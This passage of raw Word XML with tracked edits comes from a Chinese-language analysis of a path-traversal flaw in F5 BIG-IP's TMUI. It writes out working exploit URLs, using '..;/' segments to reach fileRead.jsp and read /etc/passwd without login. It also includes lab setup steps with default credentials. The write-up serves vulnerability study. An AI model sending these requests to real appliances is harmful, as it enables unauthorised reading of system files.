          <w:t>;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0DDF3D5E" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:ind w:firstLine="240"/>
        <w:pPrChange w:id="374" w:author="芮志清" w:date="2020-07-10T11:32:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>变成</w:t>
      </w:r>
      <w:del w:id="375" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
        <w:r w:rsidDel="00D972A6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>了</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4841FA7E" w14:textId="430177B0" w:rsidR="00422B7D" w:rsidRPr="00D972A6" w:rsidDel="00B92280" w:rsidRDefault="00FF4EC1" w:rsidP="00422B7D">
      <w:pPr>
        <w:rPr>
          <w:del w:id="376" w:author="芮志清" w:date="2020-07-10T11:32:00Z"/>
          <w:rPrChange w:id="377" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
            <w:rPr>
              <w:del w:id="378" w:author="芮志清" w:date="2020-07-10T11:32:00Z"/>
              <w:rStyle w:val="a4"/>
              <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:id="379" w:author="芮志清" w:date="2020-07-10T11:44:00Z">
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:rPrChange w:id="380" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:rPrChange w:id="381" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delInstrText xml:space="preserve"> HYPERLINK </w:delInstrText>
        </w:r>
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:rPrChange w:id="382" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00422B7D" w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rPrChange w:id="383" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>https://&lt;IP&gt;/tmui/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:delText>
        </w:r>
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rPrChange w:id="384" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:del>
      <w:ins w:id="385" w:author="芮志清" w:date="2020-07-10T11:44:00Z">
        <w:r w:rsidR="00EA14FB" w:rsidRPr="00D972A6">
          <w:rPr>
            <w:rPrChange w:id="386" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26338838" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRPr="00EE6F2B" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21FD9B05" w14:textId="4AC99394" w:rsidR="00422B7D" w:rsidRDefault="00E24169" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
      <w:ins w:id="387" w:author="芮志清" w:date="2020-07-10T12:01:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>另外</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="388" w:author="芮志清" w:date="2020-07-10T12:01:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>再来</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>fileRead.jsp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>并没有对收到的请求进行身份验证，后台因此直接执行</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>fileRead.jsp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>读取并返回了</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>/passwd</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>文件的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1930DE05" w14:textId="5A4F5865" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>根据以上的思路，</w:t>
      </w:r>
      <w:del w:id="389" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>其实</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>可以找出</w:t>
      </w:r>
      <w:ins w:id="390" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>其他</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="391" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>别的</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用漏洞的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">URL,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14:paraId="02C21912" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRPr="00AC7391" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC7391">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>https://&lt;IP&gt;/tmui/tmui/login/legal.html</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC7391">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>/..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AC7391">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>;/..;/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B48844E" w14:textId="47DF69E4" w:rsidR="00422B7D" w:rsidRDefault="00E24169" w:rsidP="00E24169">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="392" w:author="芮志清" w:date="2020-07-10T12:03:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="393" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>其中</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00422B7D" w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi" w:hint="eastAsia"/>
          <w:rPrChange w:id="394" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D" w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:rPrChange w:id="395" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>https:// &lt;IP&gt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:rPrChange w:id="396" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>tmui</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:rPrChange w:id="397" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:rPrChange w:id="398" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>tmui</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:rPrChange w:id="399" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>/login/legal.html</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D" w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi" w:hint="eastAsia"/>
          <w:rPrChange w:id="400" w:author="芮志清" w:date="2020-07-10T12:02:00Z">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:ins w:id="401" w:author="芮志清" w:date="2020-07-10T11:31:00Z">
        <w:r w:rsidR="00B92280">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和之前</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>login.jsp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”一样，是一个不需要登陆就能访问的页面。但是因为要向上返回两次，需要用两个</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>/.</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.;/</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>来抵消掉</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>/login/legal.html</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60EE31E8" w14:textId="77777777" w:rsidR="00E24169" w:rsidRPr="008408F1" w:rsidDel="00EA14FB" w:rsidRDefault="00E24169">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="402" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="403" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:bookmarkStart w:id="404" w:name="_Toc45275514"/>
      <w:bookmarkStart w:id="405" w:name="_Toc45275550"/>
      <w:bookmarkStart w:id="406" w:name="_Toc45275586"/>
      <w:bookmarkEnd w:id="404"/>
      <w:bookmarkEnd w:id="405"/>
      <w:bookmarkEnd w:id="406"/>
      <w:moveFromRangeStart w:id="407" w:author="芮志清" w:date="2020-07-10T11:45:00Z" w:name="move45273918"/>
    </w:p>
    <w:p w14:paraId="58088A17" w14:textId="1930A42F" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="408" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="409" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击复现</w:t>
        </w:r>
        <w:bookmarkStart w:id="410" w:name="_Toc45275515"/>
        <w:bookmarkStart w:id="411" w:name="_Toc45275551"/>
        <w:bookmarkStart w:id="412" w:name="_Toc45275587"/>
        <w:bookmarkEnd w:id="410"/>
        <w:bookmarkEnd w:id="411"/>
        <w:bookmarkEnd w:id="412"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="5AA67889" w14:textId="0C9961FF" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="413" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="414" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="415" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:t xml:space="preserve">. </w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>首先得下载</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">VMware, </w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>接着导入</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>VMware</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>后启动，默认密码为</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>root/default</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>，登录后会强制修改密码。</w:t>
        </w:r>
        <w:bookmarkStart w:id="416" w:name="_Toc45275516"/>
        <w:bookmarkStart w:id="417" w:name="_Toc45275552"/>
        <w:bookmarkStart w:id="418" w:name="_Toc45275588"/>
        <w:bookmarkEnd w:id="416"/>
        <w:bookmarkEnd w:id="417"/>
        <w:bookmarkEnd w:id="418"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="3F6AF3FD" w14:textId="03DD6FBA" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="419" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="420" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:commentRangeStart w:id="421"/>
      <w:moveFrom w:id="422" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="0050050B" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48FDD80D" wp14:editId="63BBBAB5">
              <wp:extent cx="3094892" cy="1287780"/>
              <wp:effectExtent l="0" t="0" r="0" b="762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27987"/>
                      <a:stretch/>
                    </pic:blipFill>
                    <pic:spPr bwMode="auto">
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="3094892" cy="1287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commentRangeEnd w:id="421"/>
        <w:r w:rsidR="006D551D" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rStyle w:val="af2"/>
          </w:rPr>
          <w:commentReference w:id="421"/>
        </w:r>
        <w:bookmarkStart w:id="423" w:name="_Toc45275517"/>
        <w:bookmarkStart w:id="424" w:name="_Toc45275553"/>
        <w:bookmarkStart w:id="425" w:name="_Toc45275589"/>
        <w:bookmarkEnd w:id="423"/>
        <w:bookmarkEnd w:id="424"/>
        <w:bookmarkEnd w:id="425"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="051F110C" w14:textId="05D0B4C5" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="426" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="427" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="428" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:t xml:space="preserve">. </w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>进入系统后输入命令</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>config</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>配置</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>ip</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>，有的可能会不停报错，需要多等一段时间再输入</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>config</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>就正常了。配置好</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>ip</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>后在浏览器中访问即可。</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>IP</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>会显示在登陆界面中，输入账号密码，此处账号为</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">admin, </w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>密码为虚拟机开机时所设置的密码。</w:t>
        </w:r>
        <w:bookmarkStart w:id="429" w:name="_Toc45275518"/>
        <w:bookmarkStart w:id="430" w:name="_Toc45275554"/>
        <w:bookmarkStart w:id="431" w:name="_Toc45275590"/>
        <w:bookmarkEnd w:id="429"/>
        <w:bookmarkEnd w:id="430"/>
        <w:bookmarkEnd w:id="431"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="13DDAE90" w14:textId="2F85502C" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="432" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="433" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="434" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Microsoft YaHei UI" w:eastAsia="Microsoft YaHei UI" w:hAnsi="Microsoft YaHei UI" w:hint="eastAsia"/>
            <w:noProof/>
            <w:color w:val="333333"/>
            <w:spacing w:val="8"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0487F7D9" wp14:editId="6F3BE512">
              <wp:extent cx="5295947" cy="3634740"/>
              <wp:effectExtent l="0" t="0" r="0" b="3810"/>
              <wp:docPr id="5" name="Picture 5" descr="A screenshot of a social media pos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4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8321" cy="3636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435" w:name="_Toc45275519"/>
        <w:bookmarkStart w:id="436" w:name="_Toc45275555"/>
        <w:bookmarkStart w:id="437" w:name="_Toc45275591"/>
        <w:bookmarkEnd w:id="435"/>
        <w:bookmarkEnd w:id="436"/>
        <w:bookmarkEnd w:id="437"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="3A7E7C71" w14:textId="3E7C5BCF" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="438" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="439" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="440" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:bookmarkStart w:id="441" w:name="_Toc45275520"/>
        <w:bookmarkStart w:id="442" w:name="_Toc45275556"/>
        <w:bookmarkStart w:id="443" w:name="_Toc45275592"/>
        <w:bookmarkEnd w:id="441"/>
        <w:bookmarkEnd w:id="442"/>
        <w:bookmarkEnd w:id="443"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="2178C262" w14:textId="43DAEECA" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="444" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="445" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:bookmarkStart w:id="446" w:name="_Toc45275521"/>
      <w:bookmarkStart w:id="447" w:name="_Toc45275557"/>
      <w:bookmarkStart w:id="448" w:name="_Toc45275593"/>
      <w:bookmarkEnd w:id="446"/>
      <w:bookmarkEnd w:id="447"/>
      <w:bookmarkEnd w:id="448"/>
    </w:p>
    <w:p w14:paraId="30C60072" w14:textId="7EA4D3D2" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="449" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="450" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
